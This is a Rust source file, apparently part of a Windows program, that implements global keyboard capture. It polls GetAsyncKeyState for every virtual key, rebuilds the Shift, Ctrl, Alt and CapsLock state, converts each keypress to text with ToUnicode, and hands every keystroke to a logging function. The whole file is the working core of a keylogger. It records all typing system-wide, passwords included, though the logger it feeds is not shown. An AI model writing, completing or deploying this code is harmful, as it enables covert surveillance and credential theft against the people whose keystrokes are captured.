//! High-level keyboard capture via GetAsyncKeyState polling.
//!
//! Polls all virtual keys at ~100 Hz. On each key-down leading edge, builds
//! the keyboard state MANUALLY from GetAsyncKeyState (for held modifiers) and
//! GetKeyState (for CapsLock toggle), then passes it to ToUnicode.
//!
//! This manual approach is more reliable than GetKeyboardState in a thread
//! that has no Windows message queue, because GetKeyboardState can return a
//! stale snapshot in such threads.

use lazy_static::lazy_static;
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;
use windows::Win32::UI::Input::KeyboardAndMouse::{
    GetAsyncKeyState, GetKeyState, MapVirtualKeyW, ToUnicode,
    MAPVK_VK_TO_VSC,
    VK_BACK, VK_CAPITAL, VK_CONTROL, VK_DELETE, VK_DOWN,
    VK_END, VK_ESCAPE, VK_F1, VK_F12, VK_HOME, VK_INSERT,
    VK_LEFT, VK_LSHIFT, VK_MENU, VK_NEXT, VK_PRIOR,
    VK_RETURN, VK_RIGHT, VK_RSHIFT, VK_SHIFT, VK_TAB, VK_UP,
};

lazy_static! {
    pub static ref RUNNING: AtomicBool = AtomicBool::new(true);
}

/// Helper: is the key currently physically held down?
#[inline]
unsafe fn is_held(vk: i32) -> bool {
    (GetAsyncKeyState(vk) & (0x8000u16 as i16)) != 0
}

/// Helper: is the toggle key (e.g. CapsLock) currently active?
#[inline]
unsafe fn is_toggled(vk: i32) -> bool {
    (GetKeyState(vk) & 1) != 0
}

/// Builds a 256-byte keyboard state array manually from the real-time
/// state of each modifier key. More reliable than GetKeyboardState in
/// threads without a message queue.
unsafe fn build_keyboard_state() -> [u8; 256] {
    let mut state = [0u8; 256];

    // Shift (generic + left + right)
    if is_held(VK_SHIFT.0 as i32)
        || is_held(VK_LSHIFT.0 as i32)
        || is_held(VK_RSHIFT.0 as i32)
    {
        state[VK_SHIFT.0 as usize]  = 0x80;
        state[VK_LSHIFT.0 as usize] = 0x80;
        state[VK_RSHIFT.0 as usize] = 0x80;
    }

    // Control
    if is_held(VK_CONTROL.0 as i32) {
        state[VK_CONTROL.0 as usize] = 0x80;
    }

    // Alt / AltGr
    if is_held(VK_MENU.0 as i32) {
        state[VK_MENU.0 as usize] = 0x80;
    }

    // CapsLock — bit 0 = toggle state (not held state)
    if is_toggled(VK_CAPITAL.0 as i32) {
        state[VK_CAPITAL.0 as usize] = 0x01;
    }

    state
}

/// Converts a virtual key to its Unicode character(s) using the current
/// real-time modifier state.
fn vk_to_unicode(vk: u16) -> Option<String> {
    unsafe {
        let ks = build_keyboard_state();
        let scan = MapVirtualKeyW(vk as u32, MAPVK_VK_TO_VSC);
        let mut buf = [0u16; 8];
        let n = ToUnicode(vk as u32, scan, Some(&ks), &mut buf, 0);
        if n > 0 {
            let s = String::from_utf16_lossy(&buf[..n as usize]);
            let printable: String = s
                .chars()
                .filter(|c| !c.is_control() || *c == '\n')
                .collect();
            if !printable.is_empty() {
                return Some(printable);
            }
        }
        None
    }
}

/// Tag for non-printable / navigation keys (never sent to ToUnicode).
fn special_key_label(vk: u16) -> Option<&'static str> {
    match vk {
        x if x == VK_RETURN.0 => Some("\n"),
        x if x == VK_BACK.0   => Some("[BS]"),
        x if x == VK_TAB.0    => Some("\t"),
        x if x == VK_ESCAPE.0 => Some("[ESC]"),
        x if x == VK_DELETE.0 => Some("[DEL]"),
        x if x == VK_INSERT.0 => Some("[INS]"),
        x if x == VK_HOME.0   => Some("[HOME]"),
        x if x == VK_END.0    => Some("[END]"),
        x if x == VK_PRIOR.0  => Some("[PGUP]"),
        x if x == VK_NEXT.0   => Some("[PGDN]"),
        x if x == VK_LEFT.0   => Some("[←]"),
        x if x == VK_RIGHT.0  => Some("[→]"),
        x if x == VK_UP.0     => Some("[↑]"),
        x if x == VK_DOWN.0   => Some("[↓]"),
        _ => None,
    }
}

/// Starts the keyboard polling thread (~100 Hz).
pub fn start_hook() -> thread::JoinHandle<()> {
    thread::spawn(|| {
        let mut was_down = [false; 256];

        while RUNNING.load(Ordering::SeqCst) {
            for vk in 1u16..=254 {
                // Skip pure modifier keys — their state is captured inside
                // build_keyboard_state() and baked into every vk_to_unicode call.
                if vk == VK_SHIFT.0
                    || vk == VK_LSHIFT.0
                    || vk == VK_RSHIFT.0
                    || vk == VK_CONTROL.0
                    || vk == VK_MENU.0
                    || vk == VK_CAPITAL.0
                    // F-keys produce no useful Unicode output, skip them
                    || (vk >= VK_F1.0 && vk <= VK_F12.0)
                {
                    continue;
                }

                let state = unsafe { GetAsyncKeyState(vk as i32) };
                let is_down = (state & (0x8000u16 as i16)) != 0;

                if is_down && !was_down[vk as usize] {
                    // Leading edge — key just pressed
                    if let Some(label) = special_key_label(vk) {
                        crate::logger::log_keystroke(label);
                    } else if let Some(ch) = vk_to_unicode(vk) {
                        crate::logger::log_keystroke(&ch);
                    }
                }

                was_down[vk as usize] = is_down;
            }

            thread::sleep(Duration::from_millis(10)); // ~100 Hz
        }
    })
}

/// Signals the polling thread to stop.
pub fn stop_hook() {
    RUNNING.store(false, Ordering::SeqCst);
}
